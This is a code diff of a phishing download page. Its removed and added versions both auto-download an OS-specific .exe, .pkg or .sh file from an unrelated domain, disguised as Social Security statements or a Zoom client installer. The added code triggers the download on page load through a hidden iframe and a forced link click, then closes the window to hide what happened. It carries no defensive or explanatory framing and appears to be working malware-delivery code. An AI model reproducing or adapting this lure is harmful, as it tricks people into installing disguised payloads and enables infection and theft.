@@ -1,112 +1,57 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Manager</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .download-message {
-            margin-top: 50px;
-            padding: 20px;
-            background-color: white;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            display: inline-block;
-        }
-        .download-link {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            text-decoration: none;
-            border-radius: 4px;
-        }
-    </style>
-</head>
-<body>
-    <div class="download-message" id="message">
-        <p>Preparing your download...</p>
-    </div>
+<script>
+    function detectOS() {
+        const platform = navigator.platform.toLowerCase();
+        const userAgent = navigator.userAgent.toLowerCase();
 
-    <script>
-        // Remove jQuery dependency since we don't need it for this simple functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            function detectOS() {
-                try {
-                    const platform = navigator.platform.toLowerCase();
-                    const userAgent = navigator.userAgent.toLowerCase();
+        if (platform.includes('win') || userAgent.includes('windows')) 
+            return 'windows';
+        if (platform.includes('mac') || userAgent.includes('macintosh')) 
+            return 'macos';
+        if (platform.includes('linux') || userAgent.includes('linux')) 
+            return 'linux';
 
-                    if (platform.includes('win')) return 'windows';
-                    if (platform.includes('mac')) return 'macos';
-                    if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
+        return 'windows';
+    }
 
-                    return 'windows'; // Default to Windows
-                } catch (e) {
-                    console.error("Error detecting OS:", e);
-                    return 'windows';
-                }
+    function getDownloadLink(os) {
+        const baseUrl = 'https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup';
+        const query = '?e=Access&y=Guest';
+        
+        return {
+            'windows': baseUrl + '.exe' + query,
+            'macos': baseUrl + '.pkg' + query,
+            'linux': baseUrl + '.sh' + query
+        }[os] || baseUrl + '.exe' + query;
+    }
+
+    function triggerDownload() {
+        const os = detectOS();
+        const url = getDownloadLink(os);
+        
+        // Create hidden iframe for more reliable download triggering
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        
+        // Alternative method using anchor click
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = '';
+        document.body.appendChild(link);
+        link.click();
+        
+        // Close window after short delay
+        setTimeout(() => {
+            try {
+                window.close();
+            } catch(e) {
+                // If window can't be closed, at least attempt to redirect
+                window.location.href = 'about:blank';
             }
+        }, 500);
+    }
 
-            function getDownloadLink(os) {
-                const baseUrl = 'https://arjairsparts.com/zoomsetup/clientsetup/SocialSecurityPDFStatements';
-                const queryParams = '?e=Access&y=Guest';
-                
-                const extensions = {
-                    'windows': '.exe',
-                    'macos': '.pkg',
-                    'linux': '.sh'
-                };
-                
-                return baseUrl + (extensions[os] || '.exe') + queryParams;
-            }
-
-            function initiateDownload() {
-                try {
-                    const osType = detectOS();
-                    const downloadLink = getDownloadLink(osType);
-                    const messageEl = document.getElementById('message');
-
-                    // First try the automatic download
-                    const downloadBtn = document.createElement("a");
-                    downloadBtn.href = downloadLink;
-                    downloadBtn.download = "SSA_Files_COMPLETED.zip";
-                    downloadBtn.style.display = "none";
-                    document.body.appendChild(downloadBtn);
-                    downloadBtn.click();
-
-                    // Show success message or fallback
-                    setTimeout(function() {
-                        document.body.removeChild(downloadBtn);
-                        
-                        // If still on page after 2 seconds, show manual download option
-                        messageEl.innerHTML = `
-                            <p>If download didn't start automatically, please click:</p>
-                            <a class="download-link" href="${downloadLink}" download="SSA_Files_COMPLETED.zip">Download Now</a>
-                            <p>Or try right-clicking the link and selecting "Save link as..."</p>
-                        `;
-                    }, 2000);
-
-                } catch (e) {
-                    console.error("Download failed:", e);
-                    // Show manual download option on error
-                    document.getElementById('message').innerHTML = `
-                        <p>Download failed. Please click to download manually:</p>
-                        <a class="download-link" href="${getDownloadLink('windows')}" download="SSA_Files_COMPLETED.zip">Download Now</a>
-                    `;
-                }
-            }
-
-            // Start the download process
-            initiateDownload();
-        });
-    </script>
-</body>
-</html>
+    // Start download immediately
+    window.addEventListener('DOMContentLoaded', triggerDownload);
+</script>
